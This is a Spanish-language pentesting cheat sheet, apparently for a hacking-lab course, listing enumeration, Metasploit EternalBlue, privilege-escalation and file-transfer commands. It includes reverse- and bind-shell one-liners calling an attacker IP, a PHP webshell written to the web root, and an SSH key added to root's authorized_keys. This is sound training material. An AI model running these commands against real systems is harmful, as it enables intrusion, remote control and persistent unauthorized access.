

### General
| Comando                      | Descripción                              |
|------------------------------|------------------------------------------|
| `sudo openvpn user.ovpn`      | Conectar a VPN                           |
| `ifconfig/ip a`               | Mostrar nuestra dirección IP             |
| `netstat -rn`                 | Mostrar redes accesibles a través de la VPN |
| `ssh user@10.10.10.10`        | SSH a un servidor remoto                 |
| `ftp 10.129.42.253`           | Conectar a un servidor FTP remoto        |

### tmux
| Comando                      | Descripción                              |
|------------------------------|------------------------------------------|
| `tmux`                        | Iniciar tmux                             |
| `ctrl+b`                      | tmux: prefijo por defecto                |
| `prefix c`                    | tmux: nueva ventana                      |
| `prefix 1`                    | tmux: cambiar a la ventana (1)           |
| `prefix shift+%`              | tmux: dividir panel verticalmente        |
| `prefix shift+"`              | tmux: dividir panel horizontalmente      |
| `prefix ->`                   | tmux: cambiar al panel derecho           |

### Vim
| Comando                      | Descripción                              |
|------------------------------|------------------------------------------|
| `vim file`                    | vim: abrir archivo con vim               |
| `esc+i`                       | vim: entrar en modo inserción            |
| `esc`                         | vim: volver al modo normal               |
| `x`                           | vim: cortar carácter                     |
| `dw`                          | vim: cortar palabra                      |
| `dd`                          | vim: cortar línea completa               |
| `yw`                          | vim: copiar palabra                      |
| `yy`                          | vim: copiar línea completa               |
| `p`                           | vim: pegar                               |
| `:1`                          | vim: ir al número de línea 1             |
| `:w`                          | vim: guardar el archivo                  |
| `:q`                          | vim: salir                               |
| `:q!`                         | vim: salir sin guardar                   |
| `:wq`                         | vim: guardar y salir                     |

## Pentesting

### Escaneo de Servicios
| Comando                                             | Descripción                                    |
|-----------------------------------------------------|------------------------------------------------|
| `nmap 10.129.42.253`                                | Ejecutar nmap en una IP                        |
| `nmap -sV -sC -p- 10.129.42.253`                    | Ejecutar un escaneo con script de nmap en una IP |
| `locate scripts/citrix`                             | Listar varios scripts de nmap disponibles      |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Ejecutar un script de nmap en una IP          |
| `netcat 10.10.10.10 22`                             | Capturar banner de un puerto abierto           |
| `smbclient -N -L \\\\10.129.42.253`                 | Listar comparticiones SMB                      |
| `smbclient \\\\10.129.42.253\\users`                | Conectar a una compartición SMB                |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Escanear SNMP en una IP                      |
| `onesixtyone -c dict.txt 10.129.42.254`             | Fuerza bruta de cadena secreta SNMP            |

### Enumeración Web
| Comando                                                                 | Descripción                                      |
|-------------------------------------------------------------------------|--------------------------------------------------|
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Ejecutar un escaneo de directorios en un sitio web |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Ejecutar un escaneo de subdominios en un sitio web |
| `curl -IL https://www.inlanefreight.com`                                | Capturar banner de un sitio web                  |
| `whatweb 10.10.10.121`                                                  | Listar detalles sobre el servidor web/certificados |
| `curl 10.10.10.121/robots.txt`                                          | Listar directorios potenciales en robots.txt     |
| `ctrl+U`                                                                | Ver código fuente de la página (en Firefox)      |

### Exploits Públicos
| Comando                                                        | Descripción                                          |
|----------------------------------------------------------------|------------------------------------------------------|
| `searchsploit openssh 7.2`                                     | Buscar exploits públicos para una aplicación web     |
| `msfconsole`                                                   | MSF: Iniciar el Metasploit Framework                 |
| `search exploit eternalblue`                                   | MSF: Buscar exploits públicos en MSF                 |
| `use exploit/windows/smb/ms17_010_psexec`                      | MSF: Comenzar a usar un módulo de MSF                |
| `show options`                                                 | MSF: Mostrar opciones requeridas para un módulo de MSF |
| `set RHOSTS 10.10.10.40`                                       | MSF: Establecer un valor para una opción de módulo de MSF |
| `check`                                                        | MSF: Verificar si el servidor objetivo es vulnerable |
| `exploit`                                                      | MSF: Ejecutar el exploit en el servidor objetivo     |

### Uso de Shells
| Comando                                                                                   | Descripción                                      |
|-------------------------------------------------------------------------------------------|--------------------------------------------------|
| `nc -lvnp 1234`                                                                           | Iniciar un oyente nc en un puerto local          |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                                     | Enviar una shell inversa desde el servidor remoto |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`          | Otro comando para enviar una shell inversa        |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`               | Iniciar una shell enlazada en el servidor remoto  |
| `nc 10.10.10.1 1234`                                                                      | Conectar a una shell enlazada iniciada en el servidor remoto |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                          | Actualizar TTY de la shell (1)                   |
| `ctrl+z then stty raw -echo then fg then enter twice`                                     | Actualizar TTY de la shell (2)                   |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                        | Crear un archivo php para webshell               |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                             | Ejecutar un comando en una webshell cargada      |

### Escalada de Privilegios
| Comando                                             | Descripción                                          |
|-----------------------------------------------------|------------------------------------------------------|
| `./linpeas.sh`                                      | Ejecutar script linpeas para enumerar servidor remoto |
| `sudo -l`                                           | Listar privilegios sudo disponibles                  |
| `sudo -u user /bin/echo Hello World!`               | Ejecutar un comando con sudo                         |
| `sudo su -`                                         | Cambiar a usuario root (si tenemos acceso a sudo su) |
| `sudo su user -`                                    | Cambiar a un usuario (si tenemos acceso a sudo su)   |
| `ssh-keygen -f key`                                 | Crear una nueva clave SSH                            |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Añadir la clave pública generada al usuario |
| `ssh root@10.10.10.10 -i key`                       | SSH al servidor con la clave privada generada        |

### Transferencia de Archivos
| Comando                                                               | Descripción                                      |
|-----------------------------------------------------------------------|--------------------------------------------------|
| `python3 -m http.server 8000`                                         | Iniciar un servidor web local                    |
| `wget http://10.10.14.1:8000/linpeas.sh`                              | Descargar un archivo en el servidor remoto       |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`                | Descargar un archivo en el servidor remoto       |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh`                      | Transferir un archivo al servidor remoto con scp |
| `base64 shell -w 0`                                                   | Convertir un archivo a base64                    |
| `echo f0VMR...SNIO...InmDwU | base64 -d > shell`                      | Convertir un archivo de base64 a su formato original |
| `md5sum shell`                                                        | Verificar el md5sum del archivo para asegurarse de que se convirtió correctamente |
